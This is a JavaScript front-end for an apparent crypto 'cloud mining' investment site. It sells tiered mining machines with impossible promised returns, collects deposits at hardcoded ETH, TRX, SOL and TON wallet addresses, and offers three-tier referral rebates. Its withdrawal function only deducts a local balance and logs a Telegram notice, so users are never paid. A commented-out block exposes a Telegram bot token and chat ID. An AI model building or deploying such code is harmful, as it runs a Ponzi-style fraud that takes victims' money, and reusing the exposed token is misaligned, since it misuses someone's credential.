// Global State
let userState = {
    brokerBalance: 20.00, // Initial demo balance
    foundBalance: 0.00,
    miningMachines: [],
    miningActive: false,
    miningStartTime: null,
    miningClaimable: false,
    cloudMiningActive: false,
    referralCode: 'SOL12345',
    teamRebates: { tier1: 0, tier2: 0, tier3: 0 }
};

// Mining Machine Data
const miningMachines = [
    { id: 1, name: "Mining Machine 1", cost: 10, dailyMining: 2, duration: 30 },
    { id: 2, name: "Mining Machine 2", cost: 50, dailyMining: 10, duration: 30 },
    { id: 3, name: "Mining Machine 3", cost: 150, dailyMining: 30, duration: 30 },
    { id: 4, name: "Mining Machine 4", cost: 450, dailyMining: 90, duration: 30 },
    { id: 5, name: "Mining Machine 5", cost: 1350, dailyMining: 275, duration: 30 },
    { id: 6, name: "Mining Machine 6", cost: 4050, dailyMining: 844, duration: 30 },
    { id: 7, name: "Mining Machine 7", cost: 12150, dailyMining: 2650, duration: 30 },
    { id: 8, name: "Mining Machine 8", cost: 36450, dailyMining: 8477, duration: 30 },
    { id: 9, name: "Mining Machine 9", cost: 72900, dailyMining: 29160, duration: 30 },
    { id: 10, name: "Mining Machine 10", cost: 145800, dailyMining: 72900, duration: 30 }
];

// Wallet Addresses
const walletAddresses = {
    'ETH': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'BNB': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'MORPH': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'TRX': 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    'SOL': 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu',
    'TON': 'UQCQcNww5CQho7aDQSb4AC_o3TPXeDshkD64L_iY7wknzyaz'
};

// Network to Address Mapping
const networkMapping = {
    'BEP20-USDT': 'BNB',
    'BEP20-USDC': 'BNB',
    'POLYGON-USDT': 'ETH',
    'POLYGON-USDC': 'ETH',
    'ETH-USDT': 'ETH',
    'ETH-USDC': 'ETH',
    'TRC20-USDT': 'TRX',
    'TON': 'TON'
};

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
    updateUI();
    startMiningCycleCheck();
});

function initializeApp() {
    // Load state from localStorage if available
    const savedState = localStorage.getItem('solCoinState');
    if (savedState) {
        userState = JSON.parse(savedState);
    }
    
    // Initialize mining machines grid
    renderMiningMachines();
    
    // Initialize upgrade options
    renderUpgradeOptions();
}

function setupEventListeners() {
    // Navigation
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const section = e.target.dataset.section;
            switchSection(section);
        });
    });

    // Mining controls
    document.getElementById('startMining').addEventListener('click', startMining);
    document.getElementById('claimRewards').addEventListener('click', claimRewards);

    // Network selection for deposit
    document.getElementById('depositNetwork').addEventListener('change', updateDepositAddress);

    // Withdrawal amount calculation
    document.getElementById('withdrawAmount').addEventListener('input', calculateActualArrival);
}

function switchSection(sectionName) {
    // Update active nav button
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.section === sectionName) {
            btn.classList.add('active');
        }
    });

    // Update active section
    document.querySelectorAll('.content-section').forEach(section => {
        section.classList.remove('active');
    });
    document.getElementById(sectionName).classList.add('active');

    // Special handling for withdraw section
    if (sectionName === 'withdraw') {
        updateAvailableAssets();
    }
}

function renderMiningMachines() {
    const grid = document.querySelector('.machines-grid');
    grid.innerHTML = '';

    miningMachines.forEach(machine => {
        const machineCard = document.createElement('div');
        machineCard.className = 'machine-card gold-pulse';
        machineCard.innerHTML = `
            <div class="machine-header">
                <span class="machine-name">${machine.name}</span>
                <span class="machine-cost">${machine.cost} USDT</span>
            </div>
            <div class="machine-daily">Daily Mining: ${machine.dailyMining} USDT</div>
            <div class="machine-duration">Duration: ${machine.duration} days</div>
            <button class="gold-btn buy-btn" onclick="openPurchaseModal(${machine.id})" 
                    ${userState.brokerBalance < machine.cost ? 'disabled' : ''}>
                Buy Now
            </button>
        `;
        grid.appendChild(machineCard);
    });
}

function renderUpgradeOptions() {
    const upgradeContainer = document.querySelector('.upgrade-options');
    upgradeContainer.innerHTML = `
        <div class="upgrade-option">
            <h4>Advanced Miner</h4>
            <p>Cost: 100 USDT</p>
            <p>Benefits: +15% mining efficiency</p>
            <button class="gold-btn" onclick="upgradeMembership('advanced')">Upgrade</button>
        </div>
        <div class="upgrade-option">
            <h4>Professional Miner</h4>
            <p>Cost: 500 USDT</p>
            <p>Benefits: +35% mining efficiency</p>
            <button class="gold-btn" onclick="upgradeMembership('professional')">Upgrade</button>
        </div>
        <div class="upgrade-option">
            <h4>Expert Miner</h4>
            <p>Cost: 2000 USDT</p>
            <p>Benefits: +60% mining efficiency</p>
            <button class="gold-btn" onclick="upgradeMembership('expert')">Upgrade</button>
        </div>
    `;
}

function openPurchaseModal(machineId) {
    const machine = miningMachines.find(m => m.id === machineId);
    if (!machine) return;

    const modal = document.getElementById('purchaseModal');
    const details = document.getElementById('purchaseDetails');
    
    details.innerHTML = `
        <p><strong>Machine:</strong> ${machine.name}</p>
        <p><strong>Cost:</strong> ${machine.cost} USDT</p>
        <p><strong>Daily Yield:</strong> ${machine.dailyMining} USDT</p>
        <p><strong>Cloud Mining Bonus:</strong> +30%</p>
        <p><strong>Total Daily:</strong> ${(machine.dailyMining * 1.3).toFixed(2)} USDT</p>
        <p><strong>Your Balance:</strong> ${userState.brokerBalance} USDT</p>
        ${userState.brokerBalance < machine.cost ? 
            '<p style="color: #ff4444;">Insufficient balance. Please deposit first.</p>' : 
            '<p style="color: #00ff00;">You can purchase this machine.</p>'}
    `;

    modal.classList.remove('hidden');
    modal.dataset.machineId = machineId;
}

function confirmPurchase() {
    const modal = document.getElementById('purchaseModal');
    const machineId = parseInt(modal.dataset.machineId);
    const machine = miningMachines.find(m => m.id === machineId);

    if (!machine) {
        showSuccessMessage('Error: Machine not found');
        return;
    }

    if (userState.brokerBalance < machine.cost) {
        showSuccessMessage('Error: Insufficient balance. Please deposit first.');
        return;
    }

    // Deduct cost from balance
    userState.brokerBalance -= machine.cost;
    
    // Add machine to user's collection
    const machinePurchase = {
        ...machine,
        purchaseDate: new Date().toISOString(),
        expiryDate: new Date(Date.now() + machine.duration * 24 * 60 * 60 * 1000).toISOString()
    };
    userState.miningMachines.push(machinePurchase);

    // Activate cloud mining if not already active
    if (!userState.cloudMiningActive) {
        userState.cloudMiningActive = true;
        document.getElementById('cloudMiningStatus').textContent = 'Active';
    }

    // Send Telegram notification (simulated)
    sendTelegramNotification('purchase', {
        machine: machine.name,
        amount: machine.cost,
        userBalance: userState.brokerBalance
    });

    saveState();
    updateUI();
    closeModal('purchaseModal');
    showSuccessMessage(`Successfully purchased ${machine.name}! Cloud mining activated with +30% bonus.`);
}

function startMining() {
    if (userState.miningMachines.length === 0) {
        showSuccessMessage('Please purchase a mining machine first.');
        return;
    }

    userState.miningActive = true;
    userState.miningStartTime = Date.now();
    userState.miningClaimable = false;

    // Update mining animation
    updateMiningAnimation('active');

    // Update buttons
    document.getElementById('startMining').classList.add('hidden');
    document.getElementById('claimRewards').classList.remove('hidden');

    saveState();
    updateUI();
}

function claimRewards() {
    if (!userState.miningActive || !userState.miningClaimable) {
        showSuccessMessage('Mining cycle not complete yet.');
        return;
    }

    // Calculate rewards
    const totalDailyMining = userState.miningMachines.reduce((total, machine) => {
        return total + machine.dailyMining;
    }, 0);

    // Apply cloud mining bonus
    const cloudBonus = userState.cloudMiningActive ? 0.3 : 0;
    const baseReward = totalDailyMining / 2; // 12-hour cycle = half daily
    const bonusReward = baseReward * cloudBonus;
    const totalReward = baseReward + bonusReward;

    // Add to found balance
    userState.foundBalance += totalReward;

    // Reset mining state
    userState.miningActive = false;
    userState.miningClaimable = false;
    userState.miningStartTime = null;

    // Update animation
    updateMiningAnimation('claim');

    // Update buttons
    document.getElementById('claimRewards').classList.add('hidden');
    document.getElementById('startMining').classList.remove('hidden');

    saveState();
    updateUI();
    
    setTimeout(() => {
        updateMiningAnimation('idle');
        showSuccessMessage(`Successfully claimed ${totalReward.toFixed(2)} USDT!`);
    }, 2000);
}

function startMiningCycleCheck() {
    setInterval(() => {
        if (userState.miningActive && userState.miningStartTime && !userState.miningClaimable) {
            const elapsed = Date.now() - userState.miningStartTime;
            const twelveHours = 12 * 60 * 60 * 1000;

            if (elapsed >= twelveHours) {
                userState.miningClaimable = true;
                updateMiningAnimation('complete');
                saveState();
                updateUI();
            }
        }
    }, 1000);
}

function updateMiningAnimation(state) {
    const animationContainer = document.getElementById('miningAnimation');
    
    switch(state) {
        case 'active':
            animationContainer.innerHTML = `
                <div class="mining-active-animation">
                    <div class="rotating-disc"></div>
                    <div class="particle-trail"></div>
                    <div class="gold-pulse-overlay"></div>
                </div>
            `;
            animationContainer.style.background = 'radial-gradient(circle, #1a1a1a 0%, #0a0a0a 100%)';
            break;
        case 'complete':
            animationContainer.innerHTML = `
                <div class="mining-complete-animation">
                    <div class="success-check">✓</div>
                    <div class="burst-effect"></div>
                </div>
            `;
            animationContainer.style.background = 'radial-gradient(circle, #2a2a2a 0%, #1a1a1a 100%)';
            break;
        case 'claim':
            animationContainer.innerHTML = `
                <div class="claim-animation">
                    <div class="coin-fly"></div>
                    <div class="gold-burst"></div>
                </div>
            `;
            break;
        default:
            animationContainer.innerHTML = `
                <div class="idle-animation">
                    <div class="breathing-glow"></div>
                    <p>Ready to start mining</p>
                </div>
            `;
            animationContainer.style.background = 'rgba(20, 20, 20, 0.9)';
    }
}

function updateUI() {
    // Update balances
    document.getElementById('brokerBalance').textContent = userState.brokerBalance.toFixed(2) + ' USDT';
    document.getElementById('foundBalance').textContent = userState.foundBalance.toFixed(2) + ' USDT';
    
    // Update available assets for withdrawal
    updateAvailableAssets();
    
    // Update mining buttons
    const startBtn = document.getElementById('startMining');
    const claimBtn = document.getElementById('claimRewards');
    
    if (userState.miningActive) {
        startBtn.classList.add('hidden');
        claimBtn.classList.remove('hidden');
        claimBtn.disabled = !userState.miningClaimable;
        claimBtn.textContent = userState.miningClaimable ? 'Claim Rewards' : 'Mining in Progress...';
    } else {
        startBtn.classList.remove('hidden');
        claimBtn.classList.add('hidden');
        startBtn.disabled = userState.miningMachines.length === 0;
    }
    
    // Update cloud mining status
    document.getElementById('cloudMiningStatus').textContent = 
        userState.cloudMiningActive ? 'Active' : 'Inactive';
    
    // Re-render machines to update purchase button states
    renderMiningMachines();
}

function updateAvailableAssets() {
    document.getElementById('availableAssets').textContent = 
        userState.foundBalance.toFixed(6) + ' USDT';
}

function calculateActualArrival() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
    document.getElementById('actualArrival').textContent = amount.toFixed(2) + ' USDT';
}

function setMaxWithdraw() {
    document.getElementById('withdrawAmount').value = userState.foundBalance.toFixed(2);
    calculateActualArrival();
}

function processWithdrawal() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value;
    const network = document.getElementById('withdrawNetwork').value;

    if (!amount || amount < 1) {
        showSuccessMessage('Minimum withdrawal amount is 1 USDT');
        return;
    }

    if (amount > userState.foundBalance) {
        showSuccessMessage('Insufficient found balance');
        return;
    }

    if (!address) {
        showSuccessMessage('Please enter withdrawal address');
        return;
    }

    // Process withdrawal
    userState.foundBalance -= amount;

    // Send Telegram notification
    sendTelegramNotification('withdrawal', {
        amount: amount,
        network: network,
        address: address
    });

    saveState();
    updateUI();
    showSuccessMessage(`Withdrawal request submitted for ${amount} USDT. Processing may take up to 24 hours.`);
}

function updateDepositAddress() {
    const network = document.getElementById('depositNetwork').value;
    const addressKey = networkMapping[network];
    const address = walletAddresses[addressKey];
    
    document.getElementById('depositAddress').textContent = address;
    
    // In a real implementation, you would generate a QR code here
    const qrCode = document.getElementById('qrCode');
    qrCode.innerHTML = `<div style="color: #000; padding: 20px; text-align: center;">QR Code for ${address}</div>`;
}

function copyDepositAddress() {
    const address = document.getElementById('depositAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        showSuccessMessage('Address copied to clipboard!');
    });
}

function copyReferralCode() {
    navigator.clipboard.writeText(userState.referralCode).then(() => {
        showSuccessMessage('Referral code copied to clipboard!');
    });
}

function confirmPayment() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const network = document.getElementById('depositNetwork').value;

    if (!amount || amount < 10) {
        showSuccessMessage('Minimum deposit amount is 10 USDT');
        return;
    }

    showLoading();
    
    setTimeout(() => {
        hideLoading();
        
        // Send Telegram notification
        sendTelegramNotification('deposit', {
            amount: amount,
            network: network
        });

        showSuccessMessage('Deposit submitted - awaiting confirmation (up to 24 hours)');
        closeModal('depositModal');
    }, 2000);
}

function confirmDeposit() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    
    if (amount && amount >= 10) {
        userState.brokerBalance += amount;
        saveState();
        updateUI();
        showSuccessMessage(`Deposit of ${amount} USDT confirmed!`);
        closeModal('depositModal');
    }
}

function showLoading() {
    document.getElementById('loadingOverlay').classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.add('hidden');
}

function showSuccessMessage(message) {
    document.getElementById('successText').textContent = message;
    document.getElementById('successMessage').classList.remove('hidden');
}

function closeSuccessMessage() {
    document.getElementById('successMessage').classList.add('hidden');
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.add('hidden');
}

function upgradeMembership(level) {
    const costs = {
        'advanced': 100,
        'professional': 500,
        'expert': 2000
    };

    const cost = costs[level];
    if (userState.brokerBalance < cost) {
        showSuccessMessage('Insufficient balance. Please deposit first.');
        return;
    }

    userState.brokerBalance -= cost;
    document.getElementById('currentLevel').textContent = level.charAt(0).toUpperCase() + level.slice(1);
    
    saveState();
    updateUI();
    showSuccessMessage(`Membership upgraded to ${level} level!`);
}

function sendTelegramNotification(type, data) {
    // This is a simulation - in a real implementation, you would send to a webhook
    const message = {
        type: type,
        data: data,
        userId: 'demo-user',
        timestamp: new Date().toISOString()
    };
    
    console.log('Telegram Notification:', message);
    
    // Example webhook call (commented out for static site)
    /*
    fetch('YOUR_WEBHOOK_URL', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            botToken: '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0',
            chatId: '7417215529',
            message: `New ${type} request - User: demo-user, Amount: ${data.amount} USDT`
        })
    });
    */
}

function saveState() {
    localStorage.setItem('solCoinState', JSON.stringify(userState));
}

// Export functions for global access
window.openPurchaseModal = openPurchaseModal;
window.confirmPurchase = confirmPurchase;
window.copyDepositAddress = copyDepositAddress;
window.copyReferralCode = copyReferralCode;
window.setMaxWithdraw = setMaxWithdraw;
window.processWithdrawal = processWithdrawal;
window.confirmPayment = confirmPayment;
window.confirmDeposit = confirmDeposit;
window.closeModal = closeModal;
window.closeSuccessMessage = closeSuccessMessage;
window.upgradeMembership = upgradeMembership;
